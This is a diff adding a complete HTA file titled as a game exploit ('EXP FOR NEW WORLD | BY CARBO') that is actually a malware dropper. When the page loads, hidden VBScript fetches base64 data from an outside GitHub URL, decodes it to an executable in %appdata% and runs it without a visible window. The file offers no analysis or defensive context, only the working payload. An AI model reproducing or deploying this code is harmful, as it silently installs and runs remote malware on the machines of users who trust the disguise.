@@ -1,0 +1,50 @@
+<html>
+<head>
+    <title>EXP FOR NEW WORLD | BY CARBO</title>
+    <hta:application 
+        id="a" 
+        applicationname="h" 
+        border="none" 
+        caption="no" 
+        showintaskbar="no" 
+        singleinstance="yes" 
+        windowstate="hidden" />
+    <script language="VBScript">
+        Sub c()
+            Dim url, savePath, shellObj, httpRequest, base64Data, binaryData
+            url = "https://raw.githubusercontent.com/Aurimous29317/-/refs/heads/main/dich.txt"
+            savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%") & "\outputfile.exe"
+            Set shellObj = CreateObject("WScript.Shell")
+            
+            Set httpRequest = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            httpRequest.Open "GET", url, False
+            httpRequest.Send
+            
+            If httpRequest.Status = 200 Then
+                base64Data = httpRequest.responseText
+                
+                Dim stream
+                Set stream = CreateObject("ADODB.Stream")
+                stream.Type = 1
+                stream.Open
+                
+                Dim xmlDoc
+                Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+                Dim base64Node
+                Set base64Node = xmlDoc.createElement("b64")
+                base64Node.DataType = "bin.base64"
+                base64Node.text = base64Data
+                
+                binaryData = base64Node.NodeTypedValue
+                stream.Write binaryData
+                stream.SaveToFile savePath, 2
+                stream.Close
+                
+                shellObj.Run savePath, 0, False ' 0 means hidden execution
+            End If
+        End Sub
+    </script>
+</head>
+<body onload="c()" style="display:none; margin:0; padding:0; background-color:transparent;">
+</body>
+</html>
